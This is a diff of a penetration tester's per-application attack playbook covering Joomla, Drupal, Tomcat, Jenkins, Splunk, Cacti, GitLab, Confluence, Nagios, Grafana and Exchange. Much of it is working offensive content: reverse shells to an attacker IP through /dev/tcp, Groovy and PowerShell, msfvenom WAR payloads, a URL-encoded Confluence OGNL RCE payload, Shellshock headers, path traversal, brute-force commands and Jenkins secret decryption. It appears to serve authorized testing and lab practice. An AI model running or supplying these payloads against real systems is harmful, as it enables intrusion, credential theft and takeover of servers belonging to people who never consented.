@@ -4,7 +4,7 @@
 
 ## What is this?
 
-Per-application playbook for the most common web apps and services encountered during internal/external pentests. Covers enumeration, default creds, known exploit paths, and RCE techniques. For web attack primitives (SQLi, XSS, LFI, etc.) see [[SQL Injection]], [[File Inclusion]], [[Cross-Site Scripting (XSS)]].
+Per-application playbook for the most common web apps and services encountered during internal/external pentests. Covers enumeration, default creds, known exploit paths, and RCE techniques. For web attack primitives (SQLi, XSS, LFI, etc.) see [[SQL Injection]], [[File Inclusion]], [[Cross-Site Scripting (XSS)]]. Pairs with [[Attacking Common Services]], [[Techniques/Container Escape|Container Escape]], and the [[Methdocs/Claude/THICK-00-Overview|THICK methodology]] for thick clients.
 
 ---
 
@@ -132,12 +132,11 @@ python3 wp_discuz.py -u http://target.com -p /?p=1
 # Version
 curl -s http://target.com/README.txt | head -n 5
 curl -s http://target.com/administrator/manifests/files/joomla.xml | grep '<version>'
-curl -s 'https://developer.joomla.org/stats/cms_version' | python3 -m json.tool
 
 # Automated scanners
 droopescan scan joomla --url http://target.com/
-python3 joomscan.py -u http://target.com     # joomscan (preferred over joomlascan)
-python2.7 joomlascan.py -u http://target.com  # older alt
+joomscan -u http://target.com                 # OWASP joomscan (Perl; Kali package)
+python2.7 joomlascan.py -u http://target.com  # drego85 JoomlaScan — older alt
 
 # Interesting paths
 /administrator             # admin login
@@ -151,8 +150,9 @@ python2.7 joomlascan.py -u http://target.com  # older alt
 
 ```bash
 # Brute force admin login
-python3 joomla_bruteforce.py -u http://target.com -user admin -wordlist /usr/share/wordlists/rockyou.txt
-# https://github.com/ajnik/joomla-bruteforce
+# https://github.com/ajnik/joomla-bruteforce — pass the site root; the script appends /administrator/
+python3 joomla-brute.py -u http://target.com -w /usr/share/wordlists/rockyou.txt -usr admin
+# -U users.txt instead of -usr for a user list (mutually exclusive); -p http://127.0.0.1:8080 to proxy via Burp
 ```
 
 **RCE via Template Editor (authenticated admin):**
@@ -162,7 +162,7 @@ python3 joomla_bruteforce.py -u http://target.com -user admin -wordlist /usr/sha
 4. Preview: `http://target.com/templates/<template>/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id`
 
 **CVEs:**
-- CVE-2023-23752 — Unauthenticated information disclosure (config data including DB creds)
+- CVE-2023-23752 — Unauthenticated information disclosure (config data including DB creds) — Joomla 4.0.0–4.2.7
   ```bash
   curl 'http://target.com/api/index.php/v1/config/application?public=true'
   ```
@@ -245,9 +245,9 @@ drush uinf --uid=1
 ```
 
 **CVEs (Drupalgeddon):**
-- Drupalgeddon (SA-CORE-2014-005) — SQLi → RCE — Drupal < 7.32
-- Drupalgeddon2 (CVE-2018-7600) — Unauthenticated RCE — Drupal < 7.58 / 8.x < 8.3.9
-- Drupalgeddon3 (CVE-2018-7602) — Authenticated RCE — Drupal 7.x / 8.x
+- Drupalgeddon (SA-CORE-2014-005 / CVE-2014-3704) — SQLi → RCE — Drupal 7.0–7.31
+- Drupalgeddon2 (CVE-2018-7600) — Unauthenticated RCE — Drupal < 7.58, 8.3.x < 8.3.9, 8.4.x < 8.4.6, 8.5.x < 8.5.1
+- Drupalgeddon3 (CVE-2018-7602) — Authenticated RCE (needs node-delete rights) — Drupal 7.x < 7.59, 8.4.x < 8.4.8, 8.5.x < 8.5.3
 
 ```bash
 # Drupalgeddon2
@@ -287,9 +287,11 @@ set RPORT 8080
 set STOP_ON_SUCCESS true
 run
 
-# Script alt
-python3 tomcat_brute.py -u http://target.com:8080 -w /usr/share/wordlists/rockyou.txt
-# https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
+# Script alt — https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce (needs termcolor)
+# All four flags required, case-sensitive: -U base URL, -P manager/ or host-manager/, -u users file, -p passwords file
+python3 mgr_brute.py -U http://target.com:8080/ -P manager/ \
+  -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
+  -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
 ```
 
 ### Attacking
@@ -308,7 +310,7 @@ zip -r shell.war cmd.jsp
 
 ```bash
 # Option 2 — msfvenom reverse shell WAR
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=9001 -f war -o shell.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f war -o shell.war
 nc -lvnp 9001
 # Upload via manager → access http://target.com:8080/shell/
 
@@ -321,6 +323,8 @@ run
 ```
 
 **WAR deploy via curl (no browser needed):**
+
+> [!note] `/manager/text` needs the **`manager-script`** role; `/manager/html` needs **`manager-gui`**. Creds that work in the GUI can 403 on the text endpoint (and vice versa) — check the roles in `tomcat-users.xml`.
 
 ```bash
 # Deploy using /manager/text endpoint — fully scriptable
@@ -335,6 +339,7 @@ curl -u tomcat:tomcat "http://target.com:8080/manager/text/undeploy?path=/shell"
 
 ```bash
 # AJP connector on port 8009 — reads arbitrary webapp files
+# Affected: Tomcat 6 (all), 7 < 7.0.100, 8.5 < 8.5.51, 9 < 9.0.31
 python2.7 tomcat-ajp.lfi.py target.com -p 8009 -f WEB-INF/web.xml
 # https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
 # Read web.xml for creds → pivot to manager upload
@@ -343,26 +348,30 @@ python2.7 tomcat-ajp.lfi.py target.com -p 8009 -f WEB-INF/web.xml
 **CVE-2025-24813 — Partial PUT deserialization RCE (unauthenticated, actively exploited):**
 
 ```bash
-# Affects Tomcat 9.0.0.M1–9.0.98, 10.1.0-M1–10.1.34, 11.0.0-M1–11.0.2
-# Conditions: default servlet write enabled (readonly=false) AND file-based
-# session persistence (PersistentManager + FileStore) AND a deserialization
-# gadget on the classpath. No manager creds needed.
+# Affects Tomcat 11.0.0-M1–11.0.2 (fixed 11.0.3), 10.1.0-M1–10.1.34 (fixed 10.1.35),
+# 9.0.0.M1–9.0.98 (fixed 9.0.99), and EOL 8.5.0–8.5.100.
+# Conditions: default servlet writes enabled (readonly=false — NOT the default)
+# AND partial PUT on (default) AND file-based session persistence
+# (PersistentManager + FileStore, default location) AND a deserialization
+# gadget library on the classpath. No manager creds needed.
 
-# 1. Upload a serialized Java gadget chain via partial PUT — the "."-prefixed
-#    temp name sidesteps the usual .session filename filtering
-curl -s http://target.com:8080/uploads/session -X PUT \
-  -H "Content-Range: bytes 0-/999999" \
-  --data-binary @gadget.session
-# Tomcat writes it to work/.../<name>.session
+# Mechanism: a partial PUT to /X/session (or /X.session) is staged in the work dir
+# as ".X.session" ('/' → '.'); a request with Cookie: JSESSIONID=.X makes FileStore
+# load and deserialize it.
 
-# 2. Trigger deserialization by referencing the crafted session id
-curl -s http://target.com:8080/ -H "Cookie: JSESSIONID=.<name>"
-# gadget executes on read → RCE
-# Metasploit: exploit/multi/http/tomcat_partial_put_deserialization
+# 1. Test the write primitive first — 201/204 means PUT is enabled
+curl -s -o /dev/null -w '%{http_code}\n' -X PUT http://target.com:8080/test.txt --data 'x'
+
+# 2. Exploit with Metasploit (set RPORT yourself — module default is 443 with SSL off)
+use exploit/multi/http/tomcat_partial_put_deserialization
+set RHOSTS 10.10.10.10
+set RPORT 8080
+set GADGET CommonsBeanutils1     # default; change to match the target's classpath
+run
 ```
 
 > [!warning]
-> CVE-2025-24813 is on CISA KEV — mass-exploited since March 2025. The precondition (`readonly=false` on the default servlet + file session store) is uncommon in hardened installs but ships in some appliance defaults; always test the PUT write primitive first (`curl -X PUT ... /test.txt`).
+> CVE-2025-24813 is on CISA KEV (exploitation seen from March 2025). The `readonly=false` + file-session-store precondition is uncommon, so a failed PUT test rules it out quickly.
 
 ### Key File Locations
 
@@ -381,9 +390,10 @@ curl -s http://target.com:8080/ -H "Cookie: JSESSIONID=.<name>"
 ### Enumeration
 
 ```bash
-# Default ports: 8080 (web), 5000 (agent JNLP)
+# Default ports: 8080 (web), 50000 (inbound TCP agent / JNLP — HTB Academy says 5000, the real default is 50000)
 # Auth: local DB / LDAP / AD / none
-# Default creds: admin:admin (check /var/lib/jenkins/secrets/initialAdminPassword on Linux)
+# No shipped default creds — setup wizard uses a one-time password in
+#   /var/lib/jenkins/secrets/initialAdminPassword (Linux) — admin accounts are often still weak (admin:admin is worth a try)
 
 # Interesting URLs
 /asynchPeople/            # user enumeration (no auth on some versions)
@@ -411,7 +421,7 @@ println sout
 
 ```groovy
 r = Runtime.getRuntime()
-p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/10.10.14.15/9001;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/10.10.14.5/9001;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
 
@@ -427,7 +437,7 @@ println proc.text
 **Groovy Script Console RCE — Windows reverse shell:**
 
 ```groovy
-String host = "10.10.14.15"
+String host = "10.10.14.5"
 int port = 9001
 String cmd = "cmd.exe"
 Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start()
@@ -447,17 +457,23 @@ p.destroy(); s.close()
 
 **CVE-2025-53652 — Git Parameter plugin command injection:**
 
-```bash
-# Git Parameter plugin passes an unsanitized parameter value into a git command.
-# If the job is buildable without auth (or you have Job/Build), inject via the
-# parameter value → command execution on the controller/agent.
-# ~15,000 exposed instances flagged mid-2025. Patch: Git Parameter 439.v...
-# Trigger the parameterized build with a crafted value:
-curl -s "http://target.com:8080/job/<job>/buildWithParameters?GIT_PARAM=main;id"
+- Advisory SECURITY-3419 (2025-07-09): Git Parameter plugin ≤ `439.vb_0e46ca_14534` doesn't check that the submitted value is one of the offered choices; fixed in **`444.vca_b_84d3703c2`**.
+- Needs **Item/Build** permission on a job that uses a Git Parameter. That's only unauthenticated if anonymous users have Build.
+- Jenkins rates it Medium "value injection". VulnCheck showed the unchecked value reaches shell commands the git client runs during the build, so `$(...)` in the value executes on the controller/agent.
+- The build POST needs a session cookie **and** a CSRF crumb (`/crumbIssuer/api/json`) even on anonymous instances.
+- Write-up: https://www.vulncheck.com/blog/git-parameter-rce
+
+**Decrypt stored credentials (Script Console):** `/credentials/` shows secrets masked, but the console can decrypt them:
+
+```groovy
+// Decrypt a single {AQAAABAAAA...} blob copied from credentials.xml / config.xml
+println(hudson.util.Secret.decrypt("{AQAAABAAAA...}"))
 ```
 
+Offline alternative: copy `secrets/master.key`, `secrets/hudson.util.Secret` and `credentials.xml` from `$JENKINS_HOME` and decrypt off-box.
+
 > [!note]
-> If `/script` requires auth, check for CVE-2024-23897 (arbitrary file read via CLI parser) or older unauthenticated RCE CVEs. Also check stored credentials at `/credentials/` — these often contain SSH keys, API tokens, or domain creds.
+> If `/script` requires auth, check for CVE-2024-23897 (arbitrary file read via the CLI `@file` argument expansion — Jenkins ≤ 2.441 / LTS ≤ 2.426.2) or older unauthenticated RCE CVEs. Also check stored credentials at `/credentials/` — these often contain SSH keys, API tokens, or domain creds.
 
 ---
 
@@ -481,7 +497,8 @@ curl -k https://target.com:8089/services/server/info
 ```bash
 # Use pre-built reverse shell app
 git clone https://github.com/0xjpuff/reverse_shell_splunk
-# Edit run.ps1 (Windows) or run.sh (Linux) with your LHOST/LPORT
+# Edit bin/run.ps1 (Windows, launched by run.bat) or bin/rev.py (Linux) with your LHOST/LPORT
+# default/inputs.conf holds the scripted-input stanzas — keep only the one matching the target OS
 
 # Package and upload
 tar -cvzf splunk_shell.tar.gz reverse_shell_splunk/
@@ -492,7 +509,7 @@ tar -cvzf splunk_shell.tar.gz reverse_shell_splunk/
 **Windows payload (`bin/run.ps1`):**
 
 ```powershell
-$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15', 9001)
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5', 9001)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535|%{0}
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
@@ -509,26 +526,23 @@ $client.Close()
 **Splunk Universal Forwarder — management port RCE (port 8089):**
 
 ```bash
-# UF management port often uses default or weak creds (admin:changeme, admin:admin)
-# Check if management port is open
+# Older UFs (< 7.1) shipped admin:changeme; 7.1+ has no default password, so weak/reused creds are the way in
+# (the SplunkWhisperer2 README notes the default changeme password doesn't work remotely)
 nmap -p 8089 target.com
 
 # Verify access
 curl -sk -u admin:changeme https://target.com:8089/services/server/info
 
-# Deploy a search command that executes OS code via the REST API
-# 1. Create a malicious app on attacker server (same structure as above)
-# 2. POST app package to UF via management API
-curl -sk -u admin:changeme https://target.com:8089/services/apps/local \
-  -d 'name=splunk_shell&filename=true' \
-  --data-urlencode 'update=true'
-
-# Simpler — PySplunkWhisperer2 automates UF RCE
+# PySplunkWhisperer2 — builds an app, serves it over HTTP, and has the UF install it
 git clone https://github.com/cnotin/SplunkWhisperer2
-python3 PySplunkWhisperer2/PySplunkWhisperer2_remote.py \
-  --host target.com --port 8089 \
-  --username admin --password changeme \
-  --lhost 10.10.14.15 --lport 9001
+cd SplunkWhisperer2/PySplunkWhisperer2
+python3 PySplunkWhisperer2_remote.py --host target.com --port 8089 \
+  --username admin --password '<pass>' \
+  --lhost 10.10.14.5 --lport 8001 \
+  --payload-file pwn.sh --payload '<command>'
+# --lport = the HTTP port the UF downloads the app from (default 8181), NOT a shell listener
+# --payload = literal contents of bin/<payload-file>, run as a scripted input
+# Defaults (pwn.bat / calc.exe) target Windows — set both for Linux. Press RETURN to remove _PWN_APP_.
 ```
 
 > [!note]
@@ -542,7 +556,7 @@ python3 PySplunkWhisperer2/PySplunkWhisperer2_remote.py \
 
 ```bash
 # Default ports: 80, 443, 8080
-# Default creds: prtgadmin:prtgadmin (older versions: prtgadmin:PrtgAdmin!)
+# Default creds: prtgadmin:prtgadmin
 # Admin path: http://target.com/index.htm
 ```
 
@@ -587,16 +601,33 @@ curl -s http://cacti.target.htb/cacti/CHANGELOG | head
 
 ### Attacking
 
+**CVE-2022-46169 — Unauthenticated command injection (Cacti ≤ 1.2.22, fixed 1.2.23 / 1.3.0):**
+
+- `remote_agent.php` trusts `X-Forwarded-For` for its "is this a poller?" check, so a spoofed `127.0.0.1` passes the check.
+- The `poller_id` parameter of `action=polldata` then reaches `proc_open()` unsanitized.
+- It only fires if a poller item with a PHP-script action exists (e.g. "Device - Uptime"). `host_id` / `local_data_ids` have to be brute-forced.
+
+```bash
+use exploit/linux/http/cacti_unauthenticated_cmd_injection
+set RHOSTS 10.10.10.10
+set TARGETURI /cacti/          # match the real app path
+set LHOST tun0
+run
+# Options: X_FORWARDED_FOR_IP (default 127.0.0.1), HOST_ID, LOCAL_DATA_ID to skip the brute force
+```
+
 **CVE-2024-25641 — Authenticated arbitrary file write → RCE (Cacti ≤ 1.2.26, fixed 1.2.27):**
 
 The **Package Import** feature (Console → Import/Export → Import Packages) writes bundled files to disk without constraining path/extension, so a `.php` file smuggled inside the package lands in the webroot and executes as the web user.
 
 ```bash
-# Needs a valid admin session (crack/reuse the admin hash first).
+# Needs a user with the "Import Templates" permission (crack/reuse the admin hash first).
 # Package = XML bundle of files + a signature; the importer validates the sig
 # against a key embedded IN the package → a self-signed package passes.
+# D3Ext PoC (https://github.com/D3Ext/CVE-2024-25641) — all flags required except --verbose; start nc first
 python3 exploit.py --url http://cacti.target.htb --user admin --password <pw> \
-        --lhost <tun0> --lport 9001            # D3Ext PoC → reverse shell as www-data
+        --lhost <tun0> --lport 9001            # → reverse shell as www-data
+# Metasploit alt: exploit/multi/http/cacti_package_import_rce
 
 # Payload lands in the webroot's resource dir, triggered by GET:
 #   http://cacti.target.htb/cacti/resource/<rand>.php
@@ -647,7 +678,7 @@ searchsploit osticket
 
 ```bash
 # Default port: 80/443
-# Version: http://target.com/help → shows version (no auth needed on many installs)
+# Version: http://target.com/help → shows version once logged in (register a user first if sign-up is open)
 # Public projects: http://target.com/explore/projects?visibility=public
 
 # User enumeration via sign-up (username taken = different response)
@@ -664,14 +695,20 @@ searchsploit osticket
 searchsploit gitlab
 
 # Notable CVEs
-# CVE-2021-22205 — Unauthenticated RCE via image parsing (ExifTool) — GitLab < 13.10.3
-# CVE-2023-7028 — Account takeover via password reset (no user interaction)
+# CVE-2021-22205 — Unauthenticated RCE via image parsing (ExifTool, chained with CVE-2021-22204)
+#   Affected: 11.9 ≤ v < 13.8.8, 13.9 < 13.9.6, 13.10 < 13.10.3
+# CVE-2023-7028 — Account takeover: password-reset email also sent to an attacker-supplied address
+#   Affected: 16.1 < 16.1.6, 16.2 < 16.2.9, 16.3 < 16.3.7, 16.4 < 16.4.5, 16.5 < 16.5.6, 16.6 < 16.6.4, 16.7 < 16.7.2
 ```
 
 ```bash
-# CVE-2021-22205 PoC
-python3 exploit.py -t http://target.com -l 10.10.14.15 -p 9001
-# https://github.com/inspiringz/CVE-2021-22205
+# CVE-2021-22205 — https://github.com/inspiringz/CVE-2021-22205 (positional argv, no argparse)
+python3 CVE-2021-22205.py -u http://target.com/ -m detect
+python3 CVE-2021-22205.py -u http://target.com/ -m rev 10.10.14.5 9001
+# Metasploit alt: exploit/multi/http/gitlab_exif_rce
+
+# CVE-2023-7028 — Metasploit (sets TARGETEMAIL = victim, MYEMAIL = yours)
+use auxiliary/admin/http/gitlab_password_reset_account_takeover
 ```
 
 ### GitLab Runner Token Abuse
@@ -683,8 +720,9 @@ If you gain shell on a GitLab server or CI runner host, runner tokens allow regi
 cat /etc/gitlab-runner/config.toml
 # Look for: token = "glrt-..."
 
-# Register a malicious runner pointing at your attacker instance
-# (requires the registration token from GitLab UI: Settings → CI/CD → Runners)
+# Register a runner YOU control (on your box) against the target GitLab
+# (legacy registration token from Settings → CI/CD → Runners; deprecated in newer GitLab,
+#  which instead issues glrt- auth tokens from the UI and takes `--token glrt-...`)
 gitlab-runner register \
   --non-interactive \
   --url http://target.com \
@@ -696,7 +734,7 @@ gitlab-runner register \
 # Add a .gitlab-ci.yml to any project using this runner:
 # job:
 #   script:
-#     - bash -i >& /dev/tcp/10.10.14.15/9001 0>&1
+#     - bash -i >& /dev/tcp/10.10.14.5/9001 0>&1
 ```
 
 > [!note] Runner tokens found in `config.toml` are *authentication* tokens — they allow the runner to poll for jobs. Registration tokens (from the UI) are needed to register new runners. Both are valuable: auth tokens let you impersonate the runner and receive pipeline jobs.
@@ -724,16 +762,22 @@ Confluence Server/Data Center has a string of **unauthenticated RCEs** — versi
 
 ```bash
 # CVE-2022-26134 — OGNL injection, UNAUTH RCE (all versions < 7.4.17 / 7.13.7 / 7.14.3 /
-# 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1). The OGNL expression rides in the URL PATH:
+# 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1). The OGNL expression rides in the URL PATH.
+# ⚠ UNVERIFIED payload (2026-10-07 audit could not source-check it) — test in a lab first,
+#   or use the module instead: msfconsole -q -x 'search cve:2022-26134'
 curl -s -o /dev/null -w '%{http_code}\n' \
   "http://target/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd%22%2C%23a%29%29%7D/"
 # Command output comes back in the X-Cmd response header. Decoded, the payload is:
 #   ${(#a=@...IOUtils@toString(@...Runtime@getRuntime().exec("id")...)).(setHeader("X-Cmd",#a))}
 # Use the published PoC for a stable reverse shell rather than hand-URL-encoding each command.
 
-# CVE-2021-26084 — OGNL injection via Widget Connector / text-inline.vm, pre-auth RCE
+# CVE-2021-26084 — Velocity-template OGNL injection, pre-auth RCE on most installs
 # (< 6.13.23 / 7.4.11 / 7.11.6 / 7.12.5). Sink: POST /pages/createpage-entervariables.action
 #   queryString=aaaa'%2b#{...OGNL...}%2b'
+# (Not the Widget Connector bug — that's the older CVE-2019-3396.)
+
+# CVE-2023-22527 — template injection, UNAUTH RCE (8.0.x – 8.5.3)
+#   msfconsole: search cve:2023-22527
 
 # CVE-2023-22515 — Broken access control (8.0.0–8.5.1). Not RCE: re-opens setup mode and
 # lets you CREATE AN ADMIN account, then log in and RCE via a malicious app/macro.
@@ -774,7 +818,7 @@ GET /cgi-bin/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe HTTP/1.1
 curl -H "User-Agent: () { :; }; echo; echo vulnerable" http://target.com/cgi-bin/status
 
 # Reverse shell
-curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.15/9001 0>&1" http://target.com/cgi-bin/status
+curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.5/9001 0>&1" http://target.com/cgi-bin/status
 ```
 
 ---
@@ -799,19 +843,7 @@ curl -s http://target.com/CFIDE/administrator   # admin portal
 # Headers: X-Powered-By: ColdFusion
 ```
 
-**IIS Short Name (Tilde) Enumeration:**
-
-```bash
-# Enumerate 8.3 short filenames on IIS
-java -jar iis_shortname_scanner.jar 0 5 http://target.com/
-# https://github.com/irsdl/IIS-ShortName-Scanner
-
-# Build wordlist from discovered prefix (e.g. "transf")
-grep -r "^transf" /usr/share/seclists/Discovery/Web-Content/ | sed 's/^[^:]*://' > /tmp/transf_words.txt
-
-# Brute force full filename
-gobuster dir -u http://target.com/ -w /tmp/transf_words.txt -x .aspx,.asp
-```
+> [!note] ColdFusion often runs on IIS, so pair it with [[#IIS Tilde (8.3 Short Name) Enumeration]].
 
 ### Attacking
 
@@ -822,8 +854,27 @@ searchsploit coldfusion
 # CVE-2010-2861 — Directory traversal → admin hash disclosure
 curl 'http://target.com/CFIDE/administrator/enter.cfm?locale=../../../../../../ColdFusion8/lib/password.properties%00en'
 
-# CVE-2009-2265 — Unauthenticated file upload → RCE (CF8)
-python3 cfusion_upload.py http://target.com
+# CVE-2009-2265 — Unauthenticated FCKeditor file upload → RCE (CF8)
+searchsploit -m 50057        # EDB 50057 — edit lhost/lport/rhost/rport in the script, then run
+```
+
+---
+
+## IIS Tilde (8.3 Short Name) Enumeration
+
+IIS leaks the 8.3 short-name prefix of files/dirs (e.g. `TRANSF~1.ASP`), so you can brute-force the full name from a 6-character head start. It's not specific to any app — check every IIS host.
+
+```bash
+# Enumerate 8.3 short filenames on IIS
+java -jar iis_shortname_scanner.jar 0 5 http://target.com/
+# https://github.com/irsdl/IIS-ShortName-Scanner
+# Go alternative: https://github.com/bitquark/shortscan  →  shortscan http://target.com/
+
+# Build wordlist from discovered prefix (e.g. "transf")
+grep -rh "^transf" /usr/share/seclists/Discovery/Web-Content/ > /tmp/transf_words.txt
+
+# Brute force full filename
+gobuster dir -u http://target.com/ -w /tmp/transf_words.txt -x .aspx,.asp
 ```
 
 ---
@@ -873,11 +924,15 @@ python3 cfusion_upload.py http://target.com
 
 ```bash
 # Frida — hook function and print args (example)
-frida -l hook.js -f target.exe --no-pause
+frida -l hook.js -f target.exe      # spawned process resumes automatically; add --pause to keep it suspended
+# (--no-pause was removed from frida-tools — old blog posts still show it and it now errors)
 
-# Strings on a .NET binary
+# Strings — .NET string literals are UTF-16LE, so plain `strings` misses them; run both
 strings target.exe | grep -i "pass\|key\|secret\|connect"
+strings -el target.exe | grep -i "pass\|key\|secret\|connect"
 ```
+
+> [!tip] dnSpy is archived — use the maintained fork **dnSpyEx** (or ILSpy). Run `de4dot` first on obfuscated .NET assemblies. For the full thick-client workflow see [[Methdocs/Claude/THICK-00-Overview|THICK methodology]].
 
 ---
 
@@ -891,11 +946,11 @@ strings target.exe | grep -i "pass\|key\|secret\|connect"
 | **Nagios** | `nagiosadmin:PASSW0RD` | Authenticated RCE via command injection, privesc to root |
 | **Zabbix** | `Admin:zabbix` | Built-in script execution → RCE; API accessible at `/api_jsonrpc.php` |
 | **Elasticsearch** | none (older) | Unauthenticated data access; check for Groovy/Painless script injection |
-| **DotNetNuke (DNN)** | `admin:password` | Auth bypass, file upload bypass, directory traversal CVEs |
-| **vCenter** | `administrator@vsphere.local` | CVE-2021-22005 (unauth OVA upload → RCE); shell often runs as SYSTEM/DA |
+| **DotNetNuke (DNN)** | none — set at install | Auth bypass, file upload bypass, directory traversal CVEs |
+| **vCenter** | none — `administrator@vsphere.local` is the SSO admin *username*, password set at install | CVE-2021-21972 (unauth vROps-plugin OVA upload → RCE), CVE-2021-22005 (analytics-service file upload → RCE); Windows vCenter shells can run as SYSTEM |
 | **phpMyAdmin** | `root:` (no pass) | SQL → write webshell via `SELECT INTO OUTFILE` |
-| **Confluence** | `admin:admin` | CVE-2022-26134 (unauth OGNL injection → RCE) |
-| **MediaWiki** | `admin:admin` | Template injection, file upload, check for `LocalSettings.php` creds |
+| **Confluence** | none — set at install | CVE-2022-26134 (unauth OGNL injection → RCE) — see [[#Atlassian Confluence]] |
+| **MediaWiki** | none — set at install | Template injection, file upload, check for `LocalSettings.php` creds |
 
 ---
 
@@ -928,26 +983,28 @@ nmap -sV -p 80,443 --script=http-title target.com
 
 ### Attacking
 
-**CVE-2021-25296 / 25297 / 25298 — Authenticated OS command injection (Nagios XI < 5.7.5):**
+**CVE-2021-25296 / 25297 / 25298 — Authenticated OS command injection (Nagios XI ≤ 5.7.5):**
 
 ```bash
-# Three separate injection points — Monitored Servers, MIB Manager, Network Interfaces
-python3 CVE-2021-25296.py -t http://target.com/nagiosxi -u nagiosadmin -p nagiosadmin -l 10.10.14.15 -p 9001
+# Injection points in the config wizards (Windows WMI, Switch, Cloud VM). Find the module/PoC by CVE:
+msfconsole -q -x 'search cve:2021-25296'
+searchsploit nagios xi 5.7
 ```
 
-**CVE-2019-15949 — Authenticated RCE (Nagios XI < 5.6.6):**
+**CVE-2019-15949 — Authenticated RCE as root (Nagios XI < 5.6.6):**
 
 ```bash
-# Plugin upload → command injection via filename
-python3 CVE-2019-15949.py -t http://target.com/nagiosxi -u nagiosadmin -p nagiosadmin
+# Admin uploads a "plugin" that replaces a root-executed check (e.g. check_ping) → code runs as root
+msfconsole -q -x 'search cve:2019-15949'
 ```
 
 **CVE-2023-40931 / 40932 / 40933 / 40934 — SQLi (Nagios XI < 5.11.2):**
 
 ```bash
-# Multiple unauthenticated/authenticated SQL injection points
-# /nagiosxi/admin/banner_message-ajaxhelper.php — no auth required
-sqlmap -u 'http://target.com/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=1' --batch --dbs
+# Needs a valid session (any user level). CVE-2023-40931 = id param of the banner-acknowledge endpoint (POST)
+sqlmap -u 'http://target.com/nagiosxi/admin/banner_message-ajaxhelper.php' \
+  --data 'action=acknowledge_banner_message&id=1' -p id \
+  --cookie '<session cookie from Burp>' --batch --dbs
 ```
 
 **Post-auth RCE via plugin upload (any version with admin access):**
@@ -957,7 +1014,7 @@ sqlmap -u 'http://target.com/nagiosxi/admin/banner_message-ajaxhelper.php?action
 # Upload a "plugin" that is actually a reverse shell script
 cat > shell.sh << 'EOF'
 #!/bin/bash
-bash -i >& /dev/tcp/10.10.14.15/9001 0>&1
+bash -i >& /dev/tcp/10.10.14.5/9001 0>&1
 EOF
 # Upload shell.sh as a plugin, then trigger it via a check command
 # Admin → Core Config Manager → Commands → Add new command
@@ -984,12 +1041,13 @@ sudo /usr/local/nagios/libexec/evil.sh
 
 ```bash
 # Nagios Core config — host/service check credentials
-cat /usr/local/nagios/etc/nagios.cfg
+cat /usr/local/nagios/etc/resource.cfg          # $USER1$..$USERn$ macros — check passwords live here
+cat /usr/local/nagios/etc/htpasswd.users        # web UI hashes (crack offline)
 grep -r "password\|community\|ssh" /usr/local/nagios/etc/
+# Distro packages use /etc/nagios4/ (Debian/Ubuntu) or /etc/nagios/ instead
 
-# Nagios XI config and DB
-cat /usr/local/nagiosxi/etc/components/nagiosxi-master.cfg   # DB creds
-mysql -u nagiosxi -p$(grep db_pass /usr/local/nagiosxi/etc/components/nagiosxi-master.cfg | cut -d= -f2) nagiosxi
+# Nagios XI DB creds — $cfg['db_info'] array
+grep -A8 "db_info" /usr/local/nagiosxi/html/config.inc.php
 
 # SNMP community strings for monitored devices
 grep -r "community" /usr/local/nagios/etc/
@@ -1020,7 +1078,7 @@ curl -s http://target:3000/login | grep -oiE 'grafana[^"]{0,20}'
 ```bash
 # CVE-2021-43798 — UNAUTH directory traversal / arbitrary file read (8.0.0-beta1 → 8.3.0).
 # Traverse out of any INSTALLED plugin's static dir. Plugin ids that ship by default:
-#   alertlist, graph, table, text, stat, gauge, pie-chart, ...
+#   alertlist, graph, table, text, stat, gauge, piechart, ...
 curl -s --path-as-is \
   "http://target:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
 
@@ -1055,6 +1113,9 @@ curl -sk https://target.com/owa/ -I | grep -i "x-owa\|x-ms-diagnostics\|Location
 # Version fingerprint via OWA
 curl -sk https://target.com/owa/ | grep -i "version\|14\.\|15\."
 # 14.x = Exchange 2010, 15.0 = 2013, 15.1 = 2016, 15.2 = 2019
+
+# Internal AD domain / hostname leak from the NTLM challenge
+nmap -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ target.com
 ```
 
 ### Password Spray
@@ -1063,25 +1124,23 @@ curl -sk https://target.com/owa/ | grep -i "version\|14\.\|15\."
 # MailSniper — OWA spray (PowerShell)
 Invoke-PasswordSprayOWA -ExchHostname target.com -UserList users.txt -Password 'Spring2024!'
 
-# o365spray — works against on-prem OWA too
-python3 o365spray.py --spray -U users.txt -P 'Spring2024!' --host target.com --module owa
-
-# ruler — EWS-based spray
+# ruler — spray via Autodiscover
 ruler --domain target.com brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 ```
 
 ### CVE-Based Attacks
 
 ```bash
+# Map the OWA build number to the CU/patch level first, then find modules by CVE:
 # ProxyLogon (CVE-2021-26855 + CVE-2021-27065) — Exchange 2013-2019, unauth RCE
